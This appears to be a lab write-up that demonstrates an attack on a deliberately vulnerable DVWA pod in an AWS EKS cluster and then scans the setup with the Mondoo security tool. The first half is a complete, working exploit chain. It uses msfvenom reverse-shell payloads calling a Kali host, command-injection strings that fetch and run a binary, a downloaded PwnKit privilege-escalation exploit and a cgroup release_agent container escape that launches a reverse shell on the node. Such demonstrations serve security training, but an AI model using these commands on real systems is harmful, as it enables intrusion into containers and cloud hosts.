# Hacking write-up

- you execute the terraform plan and got the following output:

```
kali_linux_public_ip = "18.117.184.121"
node_security_group_arn = "arn:aws:ec2:us-east-2:921877552404:security-group/sg-08969d523bdd3ab8c"
node_security_group_id = "sg-08969d523bdd3ab8c"
region = "us-east-2"
```

## Install mondoo operator

- follow the install steps (https://github.com/mondoohq/mondoo-operator/blob/main/docs/user-manual-kubectl.md)[https://github.com/mondoohq/mondoo-operator/blob/main/docs/user-manual-kubectl.md]

## kubernetes eks

- check everything is running

```bash
kubectl get nodes

kubectl get pods

kubectl get pods --namespace mondoo-operator

kubectl edit  mondooauditconfigs -n mondoo-operator
```

## hack execution

- create the port forwarding

```bash
kubectl get pods

NAME                                     READY   STATUS    RESTARTS   AGE
dvwa-container-escape-85c776c9bd-jmzqc   1/1     Running   0          101m

kubectl port-forward dvwa-container-escape-85c776c9bd-jmzqc 8080:80 
```

- the username for the DVWA is `admin` and the password is `password`
- finish the setup for the DVWA, click on "Create/ Reset Database" and relogin
- click on "Command Injection"

- please replace the variable `kali_linux_public_ip` in the following commands
- create the reverse meterpreter shell for the container

```bash
ssh kali@<kali_linux_public_ip>

mkdir container-escape
cd container-escape

msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<kali_linux_public_ip> LPORT=4242 -f elf > met-container

msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'
```

- create the reverse shell for the kubernetes nodes

```bash
ssh kali@<kali_linux_public_ip>

cd container-escape

msfvenom -p linux/x86/shell/reverse_tcp LHOST=<kali_linux_public_ip> LPORT=4243 -f elf > met-host

msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost 0.0.0.0; set lport 4243;run'
```

- run a web server onliner that the container and node can download the binaries

```bash
ssh kali@<kali_linux_public_ip>

cd container-escape

ruby -run -ehttpd . -p8001
```

- do the first attack to gain access to the container

```
;curl -vk http://<kali_linux_public_ip>:8001/met-container -o /tmp/met

;chmod 777 /tmp/met

;/tmp/met
```

- now you got reverse meterpreter session from the container, to get a shell type `shell`
- do the priviledge escalation within the container to gain root

```bash
id

cd /tmp

curl -vkO https://pwnkit.s3.amazonaws.com/priv-es

chmod a+x ./priv-es

./priv-es

id
```

- do the container escape

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/mounts)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "curl -vk http://<kali_linux_public_ip>:8001/met-host -o /run/met" >> /cmd
echo "chmod 777 /run/met" >> /cmd
echo "/run/met" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

- now you got the reverse shell from the kubernetes node, to verify it, show your are root and compare the ip addresses with kubectl

```bash
id

/sbin/ip a
```

```bash
kubectl get nodes
```

## scan kubernetes manifest

```bash
mondoo scan -t k8s --path dvwa-eks-deployment.yaml --no-pager
```

## scan container image

```bash
mondoo scan -t docker://public.ecr.aws/x6s5a8t7/dvwa:latest
```

## scan kubernetes eks cluster

```bash
mondoo scan -t k8s
```

## shell to kubernetes eks cluster

- ask if container is tag or digest

```bash
k8s.pods { _.containers { image containerImage { identifierType == "digest" } } }

k8s.pods { containers { name securityContext } }
```

# scan/shell kubernetes node via SSM

- replace variable `<AWS Instance ID>`

```bash
export AWS_REGION=us-east-2

mondoo scan -t aws-ec2-ssm://ssm-user@<AWS Instance ID>

mondoo shell -t aws-ec2-ssm://ssm-user@<AWS Instance ID>
```

# scan/shell kubernetes via aws api

```bash
export AWS_REGION=us-east-2

mondoo shell -t aws

aws.eks.clusters { * }

aws.eks.clusters { logging["ClusterLogging"].where( _["Enabled"] == true ) }
```